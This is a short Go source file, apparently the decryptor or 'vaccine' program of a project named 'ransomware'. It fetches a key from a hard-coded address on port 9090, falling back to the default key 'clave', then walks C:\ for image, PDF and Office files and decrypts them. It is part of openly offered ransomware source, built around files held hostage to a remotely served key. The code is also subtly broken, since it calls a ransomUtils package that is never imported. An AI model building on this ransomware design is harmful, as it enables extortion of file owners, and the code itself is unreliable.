package main

import (
	"fmt"
	"os"
	"ransomware/comunUtils"
	"ransomware/vacineUtils"
)

const defaultKey = "clave"

func main() {
	key, err := ransomUtils.ObtenerClave("192.168.1.43:9090")
	if err != nil {
		fmt.Println("Error al obtener la palabra:", err)
		key= defaultKey
	}
	files, errListFiles := comunUtils.ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
	if errListFiles != nil {
		fmt.Println("Error:", errListFiles)
	}
	fmt.Println("Descifrando los siguientes archivos:")
	for _, file := range files {
		errDecrypt := vacineUtils.DecryptFile(file, key)
		if errDecrypt != nil {
			fmt.Fprintf(os.Stderr, "Error desencriptando %s: %v\n", file, errDecrypt)
		}
		fmt.Println(file)
	}
}
